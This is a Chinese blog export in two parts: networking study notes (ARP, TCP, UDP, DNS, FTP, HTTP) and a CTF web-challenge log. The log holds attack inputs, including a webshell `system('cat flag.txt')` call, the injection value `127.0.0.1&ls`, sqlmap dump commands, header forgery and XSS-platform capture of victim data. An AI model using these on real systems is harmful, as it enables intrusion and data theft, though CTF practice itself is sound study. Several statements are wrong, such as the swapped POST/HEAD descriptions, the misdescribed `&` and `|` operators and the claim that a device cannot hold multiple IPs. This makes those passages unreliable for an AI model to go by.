地址。当本网络的所有主机收到该ARP数据包时，首先检查数据包中的IP地址是否是自己的IP地址，如果不是，则忽略该数据包，如果是，则首先从数据包中取出源主机的IP和MAC地址写入到ARP列表中，如果已经存在，则覆盖，然后将自己的MAC地址写入ARP响应包中，告诉源主机自己是它想要找的MAC地址。源主机收到ARP响应包后。将目的主机的IP和MAC地址写入ARP列表，并利用此信息发送数据。如果源主机一直没有收到ARP响应数据包，表示ARP查询失败。<br>注意：广播（255.255.255.255）发送ARP请求，单播发送ARP响应</li></ul><hr><p>MAC地址：MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡(Network lnterface Card)的EPROM(一种闪存芯片，通常可以通过程序擦写)。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位的。MAC地址的长度为48位(6个字节)，通常表示为12个16进制数，如：00-16-EA-AE-3C-40就是一个MAC地址，其中前3个字节，16进制数00-16-EA代表网络硬件制造商的编号，它由IEEE(电气与电子工程师协会)分配，而后3个字节，16进制数AE-3C-40代表该制造商所制造的某个网络产品(如网卡)的系列号。只要不更改自己的MAC地址，MAC地址在世界是唯一的。形象地说，MAC地址就如同身份证上的身份证号码，具有唯一性。<br><em>震网病毒攻击了西门子泄露MAC的PLC</em></p><hr><hr><h2 id="网络之间信息传送的协议（网际层）"><a href="#网络之间信息传送的协议（网际层）" class="headerlink" title="网络之间信息传送的协议（网际层）"></a>网络之间信息传送的协议（网际层）</h2><p><strong>IP协议：</strong> 将IP信息包从源设备(如用户的计算机)传到目的设备(如某部门的www服务器)</p><ul><li><input checked="" disabled="" type="checkbox"> 为了达到这样的目的，IP必须依赖<strong>IP地址</strong>与<strong>IP路由器</strong>两种机制来实现。<br>IP地址<br>IP规定网络上所有的设备都必须有一个独一无二的IP地址，就好比是邮件上都必须注明收件人地址，邮递员才能将邮件送到。同理，每个IP信息包都必须包含有目的设备的IP地址，信息包才可以正确地送到目的地。同一设备不可以拥有多个IP地址，所有使用IP的网络设备至少有一个唯一的IP地址。<br>IP路由<br>互联网是由许多个网络连接所形成的大型网络。如果要在互联网中传送IP信息包，除了确保网络上每个设备都有一个唯一的IP地址之外，网络之间还必须有传送的机制，才能将IP信息包通过一个个的网络传送到目的地。此种传送机制称为IP路由。<br>各个网络通过路由器相互连接。路由器的功能是为IP信息包选择传送的路径。换言之，必须依靠沿途各路由器的通力合作，才能将IP信息包送到目的地。在IP路由的过程中，由路由器负责选择路径，IP信息包则是被传送的对象。<img src="https://img-blog.csdnimg.cn/2020120319503470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><hr><p>IP地址与IP路由是IP信息包传送的基础。此外，IP信息包传送时还有一项很重要的特性，即使用非连接式的传送方式。非连接式的传送方式是指IP信息包传送时，源设备与目的设备双方不必事先连接，即可将IP信息包送达。即源设备完全不用理会目的设备，而只是单纯地将IP信息包逐一送出。至于目的设备是否收到每个信息包、是否收到正确的信息包等，则由上层的协议(例如TCP)来负责检查。</p><hr><p>子网掩码：用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在广域网上。</p><hr><h2 id="网络之间信息传送的协议（传输层）"><a href="#网络之间信息传送的协议（传输层）" class="headerlink" title="网络之间信息传送的协议（传输层）"></a>网络之间信息传送的协议（传输层）</h2><p><strong>①TCP协议：</strong> 为不可靠的互联网络上提供可靠的端到端字节流</p><ul><li><p><input checked="" disabled="" type="checkbox">  应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，然后TCP把数据流分区成适当长度的报文段（通常受该计算机连接的网络的数据链路层的最大传输单元（MTU）的限制）。之后TCP把结果包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。每台支持TCP的机器都有一个TCP传输实体。TCP实体可以是一个库过程、一个用户进程，或者内核的一部分。在所有这些情形下，它管理TCP流，以及与IP层之间的接口。TCP传输实体接受本地进程的用户数据流，将它们分割成不超过64KB（实际上去掉IP和TCP头，通常不超过1460数据字节）的分段，每个分段以单独的IP数据报形式发送。当包含TCP数据的数据报到达一台机器时，它们被递交给TCP传输实体，TCP传输实体重构出原始的字节流。为简化起见，我们有时候仅仅用“TCP”来代表TCP传输实体（一段软件）或者TCP协议（一组规则）。例如，在“用户将数据交给TCP”这句话中，很显然这里指的是TCP传输实体。IP层并不保证数据报一定被正确地递交到接收方，也不指示数据报的发送速度有多快。正是TCP负责既要足够快地发送数据报，以便使用网络容量，但又不能引起网络拥塞：而且，TCP超时后，要重传没有递交的数据报。即使被正确递交的数据报，也可能存在错序的问题，这也是TCP的责任，它必须把接收到的数据报重新装配成正确的顺序。</p></li><li><p><strong>TCP</strong></p></li></ul><p>建立方式——三次握手：<br>第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND(发送)状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（seq=y），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态；<br>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED（已建立）状态，完成三次握手。</p><p><img src="https://img-blog.csdnimg.cn/20201203221946406.gif"></p><p>连接终止——四次挥手：<br>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可以接受数据。<br>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1。<br>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。<br>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</p><p>说明：<br>1）SYN和ACK是标志位（0/1）（ACK=1表明ack有效），seq是序列号，ack是确认号。<br>2）给对方的确认方式就是把对方传来的seq+1并赋给ack。<br>3）SYN攻击 用众多伪造ip地址向服务器发送SYN=1（请求连接），让服务器处于SYN-RCVD状态，但都无法第三次握手（因为伪造ip不存在）<br>4）4次挥手中的FIN就相当于三次握手中的SYN。<br>5）序号seq，确认序号ack，确认标志位ACK作用还是一样的，就是确认作用（把seq加上1赋给ack，并把ACK置1）<br>6）为什么一个3次1个4次不一样？<br>因为两端的数据并不是同时发送完，所以两端谁发送完数据都需要自己告诉对方一次，并且对方确认一次。</p><p><img src="https://img-blog.csdnimg.cn/20201203210440531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><hr><p>互联网络与单个网络有很大的不同，因为互联网络的不同部分可能有截然不同的拓扑结构、带宽、延迟、数据包大小和其他参数。TCP的设计目标是能够动态地适应互联网络的这些特性，而且具备面对各种故障时的健壮性。不同主机的应用层之间经常需要可靠的、像管道一样的连接，但是IP层不提供这样的流机制，而是提供不可靠的包交换。简而言之，TCP必须提供可靠性的良好性能，这正是大多数用户所期望的而IP又没有提供的功能。</p><hr><p><strong>②UDP协议：</strong> 为应用程序提供了无需建立连接就可以发送封装的 IP 数据包的方法</p><ul><li><input checked="" disabled="" type="checkbox"> 对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界</li></ul><table><thead><tr><th align="left"></th><th align="center">UDP</th><th align="center">TCP</th></tr></thead><tbody><tr><td align="left">是否连接</td><td align="center">无连接</td><td align="center">面向连接</td></tr><tr><td align="left">是否可靠</td><td align="center">不可靠传输，不使用流量控制和拥塞控制</td><td align="center">可靠传输，使用流量控制和拥塞控制</td></tr><tr><td align="left">连接对象个数</td><td align="center">支持一对一，一对多，多对一和多对多的交互通信</td><td align="center">只能一对一通信</td></tr><tr><td align="left">传输方式</td><td align="center">面向报文</td><td align="center">面向字节流</td></tr><tr><td align="left">首部字节</td><td align="center">8字节</td><td align="center">最小20，最大60字节</td></tr><tr><td align="left">应用环境</td><td align="center">适用于实时通信（IP电话、视频会议、直播等）</td><td align="center">适用于要求可靠传输的应用（文件传输）</td></tr><tr><td align="left">下层协议</td><td align="center">TFTP、SNMP、NFS、DNS、BOOTP</td><td align="center">FTP、Telnet、SMTP、POP3、HTTP</td></tr></tbody></table><ul><li>TCP向上层提供面向连接的可靠服务 ，UDP向上层提供无连接不可靠服务。</li><li> 虽然 UDP 并没有 TCP 传输来的准确，但是也能在很多实时性要求高的地方有所作为</li><li> 对数据准确性要求高，速度可以相对较慢的，可以选用TCP。不产生任何额外的数据，即使知道有破坏的包也不进行重发。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择。</li></ul><h2 id="域名与IP间的协议"><a href="#域名与IP间的协议" class="headerlink" title="域名与IP间的协议"></a>域名与IP间的协议</h2><p><strong>DNS协议：</strong> 提供域名和IP地址相互映射的一个分布式数据库</p><ul><li><input checked="" disabled="" type="checkbox"> <strong>域名解析：</strong> 首先，根据域名系统域名空间的层次结构将其按子树划分为不同的区域，每个区域可看作是负责层次结构中这一部分节点的可管理的权力实体。例如，整个域的顶层区域由ICANN负责管理，一些国家域名及其下属的那些节点又构成了各自的区域，像.cn域就由CNNIC负责管理。而.cn域下又被划分为一些更小的区域，例如.fudan.edu.cn由复旦大学网络中心负责管理。其次，每个区域必须有对应的域名服务器，每个区域中包含的信息存储在域名服务器上。一个区域中可有两个或多个域名服务器，这样即使其中一个域名服务器出了故障，另一个域名服务器仍然可以正常提供信息。一个域名服务器也可以同时管辖多个区域。域名服务器在接到用户发出的请求后查询自身的资源记录集合，返回用户想要得到的最终答案，或者当自身的资源记录集合中查不到所需要的答案时，返回指向另外一个域名服务器的指针，用户将继续向那个域名服务器发出请求。所以说，域名服务器不需要记录所有下属域名和主机的信息，对于其中的子域(如果存在)，只需要知道子域的域名服务器即可。资源记录是一个域名到值的绑定，它包括以下字段：域名、值、类型、分类和生命期。域名字段和值字段分别用来表示解析的内容和解析返回的结果。类型字段代表了值的种类：类型为A代表值字段是一个IP地址，即用户所要的最终答案；类型为NS代表值字段是另一个域名服务器的域名，该域名服务器能够知道如何解析域名字段所指定的域名；类型为CNAME代表值字段是由域名所指定的主机的一个别名；类型为MX代表值字段是一个邮件服务器的域名，该邮件服务器接收由域名字段所指定的域的邮件；类型PTR用于域名反解等。分类字段允许指定其他的记录类型。生命期字段用于指出该资源记录的有效期是多少。为减少域名解析时间，域名服务器会缓存一些曾经查询过的、来自其他域名服务器的资源记录。由于这些资源记录会因为更改而失效，因此域名服务器设置了生命期，到期的资源记录会被清除出缓存。<br>根域名服务器知道所有顶级域名的域名服务器，对应于每个顶级域名，它都有两条资源记录：一条是NS资源记录，域名字段是该顶级域名，值字段是该顶级域名解析的域名服务器的域名；另一条是A资源记录，用来指明该域名服务器的域名对应的IP地址。综合使用这两条记录，就可以知道对该域下的某个域名解析，应该继续去哪个IP地址的域名服务器寻找。第二层的域名服务器类似地存放各个第三层域名服务器的指针。第三层的域名服务器会出现A、CNAME、MX等类型的资源记录。每个域名服务器都有根域名服务器的地址记录。最后，一个需要域名解析的用户先将该解析请求发往本地的域名服务器。如果本地的域名服务器能够解析，则直接得到结果，否则本地的域名服务器将向根域名服务器发送请求。依据根域名服务器返回的指针再查询下一层的域名服务器，依此类推，最后得到所要解析域名的IP地址。</li></ul><p><strong>域名反解：</strong> 是指给出一个IP地址，找出其对应的域名，这也是利用DNS来实现的。举个例子，假设一个要反解的IP地址为202.120.225.9，系统将其改写为9.225.120.202. in-addr.arpa，然后按域名解析的方式查询。这需要在被查询主机的本地域名服务器上有一条对应于9.225.120.202.in-addr.arpa的资源记录，类型是PTR，值是其域名。</p><p><del>（域名系统的名字空间）</del></p><hr><p>在浏览器中输入<a href="http://www.baidu.com后执行的全部过程/">www.baidu.com后执行的全部过程</a> ：<br>1、客户端浏览器通过DNS解析到<a href="http://www.baidu.com的ip地址220.181.27.48,通过这个ip地址找到客户端到服务器的路径.客户端浏览器发起一个http会话到220.161.27.48,然后通过tcp进行封装数据包,输入到网络层./">www.baidu.com的IP地址220.181.27.48，通过这个IP地址找到客户端到服务器的路径。客户端浏览器发起一个HTTP会话到220.161.27.48，然后通过TCP进行封装数据包，输入到网络层。</a><br>  2、在客户端的传输层(添加TCP头)，把HTTP会话请求分成报文段，添加源和目的端口，如服务器使用80端口监听客户端的请求，客户端由系统随机选择一个端口如5000，与服务器进行交换，服务器把相应的请求返回给客户端的5000端口。然后使用IP层的IP地址查找目的端。<br>  3、客户端的网络层（添加IP头）不用关系应用层或者传输层的东西，主要做的是通过查找路由表确定如何到达服务器，期间可能经过多个路由器，这些都是由路由器来完成的工作，我不作过多的描述，无非就是通过查找路由表决定通过那个路径到达服务器。<br>  4、客户端的链路层（添加MAC头），包通过链路层发送到路由器，通过邻居协议查找给定IP地址的MAC地址，然后发送ARP请求查找目的地址，如果得到回应后就可以使用ARP的请求应答交换的IP数据包现在就可以传输了，然后发送IP数据包到达服务器的地址。</p><hr><h2 id="传输文件的协议"><a href="#传输文件的协议" class="headerlink" title="传输文件的协议"></a>传输文件的协议</h2><p>  <strong>FTP协议：</strong> 将文件从一台计算机传送到另一台计算机</p><ul><li><input checked="" disabled="" type="checkbox"> FTP支持两种模式，一种方式叫做Standard (也就是 PORT方式，主动方式)，一种是 Passive(也就是PASV，被动方式)。 Standard模式 FTP的客户端发送 PORT 命令到FTP Serve。Passive模式FTP的客户端发送 PASV命令到 FTP Server。<br>Port：<br>FTP 客户端首先和FTP服务器的TCP 21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送PORT命令。 PORT命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过自己的TCP 20端口连接至客户端的指定端口发送数据。 FTP server必须和客户端建立一个新的连接用来传送数据。<br>Passive：<br>在建立控制通道的时候和Standard模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。FTP服务器收到Pasv命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器此端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。<br>很多防火墙在设置的时候都是不允许接受外部发起的连接的，所以许多位于防火墙后或内网的FTP服务器不支持PASV模式，因为客户端无法穿过防火墙打开FTP服务器的高端端口；而许多内网的客户端不能用PORT模式登陆FTP服务器，因为从服务器的TCP 20无法和内部网络的客户端建立一个新的连接，造成无法工作。</li></ul><hr><p>默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p><hr><h2 id="客户端和服务器端请求和应答的标准协议"><a href="#客户端和服务器端请求和应答的标准协议" class="headerlink" title="客户端和服务器端请求和应答的标准协议"></a>客户端和服务器端请求和应答的标准协议</h2><p><strong>HTTP协议：</strong> 客户端和服务端标准通信格式</p><ul><li><input checked="" disabled="" type="checkbox"> 一个客户机与服务器建立连接后，发送一个请求给服务器，请求方式的格式为，统一资源标识符、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。服务器接到请求后，给予相应的响应信息，其格式为一个状态行包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。其实简单说就是任何服务器除了包括HTML文件以外，还有一个HTTP驻留程序，用于响应用户请求。你的浏览器是HTTP客户，向服务器发送请求，当浏览器中输入了一个开始文件或点击了一个超级链接时，浏览器就向服务器发送了HTTP请求，此请求被送往由IP地址指定的URL。驻留程序接收到请求，在进行必要的操作后回送所要求的文件。在这一过程中，在网络上发送和接收的数据已经被分成一个或多个数据包（packet），每个数据包包括：要传送的数据；控制信息，即告诉网络怎样处理数据包。TCP/IP决定了每个数据包的格式。如果事先不告诉你，你可能不会知道信息被分成用于传输和再重新组合起来的许多小块。许多HTTP通讯是由一个用户代理初始化的并且包括一个申请在源服务器上资源的请求。最简单的情况可能是在用户代理(UA)和源服务器(O)之间通过一个单独的连接来完成。当一个或多个中介出现在请求/响应链中时，情况就变得复杂一些。中介有三种：代理(Proxy)、网关(Gateway)和通道(Tunnel)。一个代理根据URI的绝对格式来接受请求，重写全部或部分消息，通过URI的标识把已格式化过的请求发送到服务器。网关是一个接收代理，作为一些其它服务器的上层，并且如果必须的话，可以把请求翻译给下层的服务器协议。一个通道作为不改变消息的两个连接之间的中继点。当通讯需要通过一个中介(例如：防火墙等)或者是中介不能识别消息的内容时，通道经常被使用。</li></ul><hr><p>客户与服务器之间的HTTP连接是一种一次性连接，它限制每次连接只处理一个请求，当服务器返回本次请求的应答后便立即关闭连接，下次请求再重新建立连接。这种一次性连接主要考虑到WWW服务器面向的是Internet中成干上万个用户，且只能提供有限个连接，故服务器不会让一个连接处于等待状态，及时地释放连接可以大大提高服务器的执行效率。 [7]<br>HTTP是一种无状态协议，即服务器不保留与客户交易时的任何状态。这就大大减轻了服务器记忆负担，从而保持较快的响应速度。HTTP是一种面向对象的协议。允许传送任意类型的数据对象。它通过数据类型和长度来标识所传送的数据内容和大小，并允许对数据进行压缩传送。当用户在一个HTML文档中定义了一个超文本链后，浏览器将通过TCP/IP协议与指定的服务器建立连接。</p><hr><table><thead><tr><th>HTTP方法</th><th>作用描述</th></tr></thead><tbody><tr><td>GET</td><td>客户端请求指定资源信息，服务器返回指定资源</td></tr><tr><td>POST</td><td>只请求响应报文中的HTTP首部</td></tr><tr><td>HEAD</td><td>将客户端的数据提交到服务器，例：注册表单</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档内容</td></tr><tr><td>DELETE</td><td>请求服务器删除Request-URI所标识的资源</td></tr><tr><td>MOVE</td><td>请求服务器将制定的页面移至另一个网络地址</td></tr></tbody></table><p>HTTP状态码<br>所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。状态代码的第一个数字代表当前响应的类型：</p><ul><li>1xx消息——请求已被服务器接收，继续处理</li><li>2xx成功——请求已成功被服务器接收、理解、并接受</li><li>3xx重定向——需要后续操作才能完成这一请求</li><li>4xx请求错误——请求含有词法错误或者无法被执行</li><li>5xx服务器错误——服务器在处理某个正确请求时发生错误</li></ul>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web</title>
    <link href="/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="基础认证题"><a href="#基础认证题" class="headerlink" title="基础认证题"></a>基础认证题</h2><p><img src="https://img-blog.csdnimg.cn/20201123215812631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>页面中依据提示 可猜测用户为admin<br>可弱口令尝试（admin）——失败<br>暴脾气，，，词典爆破！<br>下载其页面提供的词典<br>抓包处对上图circle处进行解密 在burp的decode模板中进行查询可知其加密方式为base64<br>载入词典<br>此处开始走弯路：1.词典所加载的均为密码，缺少用户名（发现问题后，度娘学习正则表达式，很好，又学了个奇奇怪怪的姿势）2.词典爆破后一直都是401返回，长度均为404，没有出现200返回（原因未明）<br>——————————————我是分割线———————————<br>折腾一段时间后（替换爆破点，加载词典，设置解密方式），成功爆破出长度为200</p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>要用到工具Githack,虚拟机一找，没有，网上查找Githack安装，？？？没有输入法吗，掉进一个大坑……配置源，使用sudo，dpkg命令……暂时做不下去了<br><img src="https://img-blog.csdnimg.cn/20201124083620314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>搜素引擎爬取各个网站时，网站告知搜索引擎的爬取范围（设置爬取权限）,robots.txt就作为搜素引擎爬取网站时第一个需要查看的文件</p><h2 id="灰色按钮（disabled-button）"><a href="#灰色按钮（disabled-button）" class="headerlink" title="灰色按钮（disabled button）"></a>灰色按钮（disabled button）</h2><p>利用开发者工具查看源代码，直接修改按钮对应的代码处（删除或注释掉带有禁用按钮的代码）涉及到html和php的学�</p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。</p><h2 id="HTTP中的GET和POST传参"><a href="#HTTP中的GET和POST传参" class="headerlink" title="HTTP中的GET和POST传参"></a>HTTP中的GET和POST传参</h2><p>GET传参在URL地址栏直接后面跟 <strong>/?参数名+数值</strong><br>如 /?a=1 传参a=1<br>POST传参不能直接在URL栏里输入，使用插件hackbar，可以进行post传参</p><hr><p>post传参有四种方式，基本样式如下：</p><p>POST <a href="http://www.example.com/">http://www.example.com</a> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded;charset=utf-8<br>title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</p><hr><h2 id="IP伪造-xff和referer"><a href="#IP伪造-xff和referer" class="headerlink" title="IP伪造-xff和referer"></a>IP伪造-xff和referer</h2><p>抓包后改包：<br>添加 X-Forwarded-For：ip Referer：网站<br>ip和网站均是要伪造的对象</p><p>X-Forwarded-For是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中，X-Real-IP，一般只记录真实发出请求的客户端IP</p><h2 id="curl-–local-port-xx"><a href="#curl-–local-port-xx" class="headerlink" title="curl –local-port xx"></a>curl –local-port xx</h2><p><a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h3 id="Please-use-port-51-to-visit-this-site"><a href="#Please-use-port-51-to-visit-this-site" class="headerlink" title="Please use port 51 to visit this site."></a>Please use port 51 to visit this site.</h3><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>使用蚁剑或post方式 使用shell=system(‘cat flag.txt’)</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>由于输入对管道符 | || &amp; &amp;&amp;过滤不严产生的漏洞<br>windows或linux下:</p><table><thead><tr><th align="center">格式</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">command1 &amp;&amp; command2</td><td align="center">先执行command1，如果为真，再执行command2</td></tr><tr><td align="center">command1| command2</td><td align="center">只执行command2</td></tr><tr><td align="center">command1 &amp; command2</td><td align="center">先执行command2后执行command1</td></tr><tr><td align="center">command1|| command2</td><td align="center">先执行command1，如果为假，再执行command2</td></tr></tbody></table><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>Windows下githack下载不出现./../.git<br>只下载了50x和index （原因不明！）–补充：使用了旧版本的Githuack<br><img src="https://img-blog.csdnimg.cn/20210120134909178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">kali内利用githack 却未发现50x和index</p><hr><blockquote><p>git log #查看提交历史</p></blockquote><p><strong>方法一：</strong><br>在目标文件夹终端直接git show出答案</p><blockquote><p>git show：显示一个或多个对象(<code>blobs</code>，树，标签和提交)。对于提交，它还能<strong>显示日志消息和文本差异。</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210120134849174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>方法二：</strong><br>也可以使用git reset –hard “add flag的那个序列号”回退存有flag的版本</p><blockquote><p>git reset 序列号：回退版本</p></blockquote><p>此时文件夹内出现50x和index以及一个flag的txt<br><img src="https://img-blog.csdnimg.cn/20210121000823424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><blockquote><p>dvcs-ripper 参数:</p><p>-c perform ‘hg revert’ on end (default)<br>-b &lt;s&gt; Use branch &lt;s&gt; (default: )<br>-a &lt;s&gt; Use agent &lt;s&gt; (default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2)<br>-s do not verify SSL cert<br>-p &lt;h&gt; use proxy <h> for connections<br>-v verbose (-vv will be more verbose)</p></blockquote><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104348703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104126693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>原文件不存在，直接在url得到<img src="https://img-blog.csdnimg.cn/20210311104220836.png"></p><hr><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>使用sqlmap<br>整数型以及字符型：<br><code>python3 sqlmap.py -u &quot;url&quot; --cookie=&quot;&quot; </code>（Ⅰ）<br>（Ⅰ）跟参数–current-db<br>（Ⅰ）跟参数-D 数据库名 –tables<br>（Ⅰ）跟参数-D 数据库名 -T 表名 –columns<br>（Ⅰ）跟参数-D 数据库名 -T 表名 (-Ｃ 列名) –dump</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><code>127.0.0.1&amp;ls</code><br>出来一个<code>*.php</code><br>此时拼接<code>cat *.php</code>无回显（<a href="https://xz.aliyun.com/t/8125">传送门</a>）<br>此处是字符编码的问题 后面跟<code>| base64</code>出现一堆字符后复制解码即可</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>在xss平台上注册账号 建立一个项目（勾选默认配置即可）<br>复制xss代码<br><img src="https://img-blog.csdnimg.cn/20210218112452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"> 先在第一栏随便输入字符<br>然后复制url到第二栏 并且更改刚刚的字符 替换拼接为xss代码<br>发送至服务器即可<br><img src="https://img-blog.csdnimg.cn/20210218112842968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">在项目里边可以看到反弹回来的内容<br><img src="https://img-blog.csdnimg.cn/20210218112901552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><p>vim是一种开源编辑器，由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：<br>第一次产生的交换文件名为 <code>. .swp</code><br>再次意外退出后，将会产生名为<code>. .swo</code>的交换文件<br>第三次产生的交换文件则为<code> . 